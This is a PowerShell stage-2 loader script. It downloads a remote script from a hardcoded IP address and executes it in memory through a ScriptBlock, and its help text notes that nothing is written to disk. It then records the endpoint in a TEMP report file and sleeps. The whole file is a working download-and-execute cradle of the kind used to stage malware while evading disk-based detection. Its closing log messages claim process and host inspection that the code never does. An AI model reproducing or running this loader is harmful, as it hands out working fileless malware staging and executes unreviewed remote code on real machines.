
<#
.SYNOPSIS
    Endpoint-driven in-memory script loader.

.DESCRIPTION
    Resolves the configured endpoint, downloads the stage 2 text
    with a bounded timeout, checks the returned length and then
    executes the script block in the current session.

.NOTES
    No script content is written to disk.
#>
$TargetUrl = 'http://198.51.100.107/stage2.ps1'
$TracePath = "$env:TEMP\report.txt"
$TimeoutSec = 154
$ErrorActionPreference = "Stop"

# Text retrieval
function Get-StageScriptText {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [int]$TimeoutSec = 154
    )

    Write-Verbose ("Fetching script text from " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    return $ClientObject.DownloadString($SourceUrl)
}

# In-memory execution
function Invoke-Stage2Script {
    [CmdletBinding()]
    param(
        [string]$ScriptBody = ""
    )

    if ([string]::IsNullOrWhiteSpace($ScriptBody)) {
        throw "Stage 2 script body is empty"
    }
    Write-Verbose ("Script length: " + $ScriptBody.Length)
    $ScriptBlock = [ScriptBlock]::Create($ScriptBody)
    return $ScriptBlock.Invoke()
}

Write-Verbose "Starting in-memory stage"
$StageScript = Get-StageScriptText -SourceUrl $TargetUrl -TimeoutSec $TimeoutSec
$FetchResult = Invoke-Stage2Script -ScriptBody $StageScript
Write-Verbose "Stage result: $($FetchResult)"

$LoadReport = [ordered]@{
    Stage = "memory"
    Endpoint = $TargetUrl
    ScriptLength = $StageScript.Length
}
$LoadReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $TracePath -Append
Write-Verbose "Writing diagnostic marker"
Write-Verbose "Inspecting process list"
Write-Verbose "Operation completed"
Write-Verbose "Stage handoff finished"
Write-Verbose "Checking local path"
Write-Verbose "Reading configuration values"
Write-Verbose "Validating result"
Write-Verbose "Collecting host metadata"
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
Start-Sleep -Seconds 35
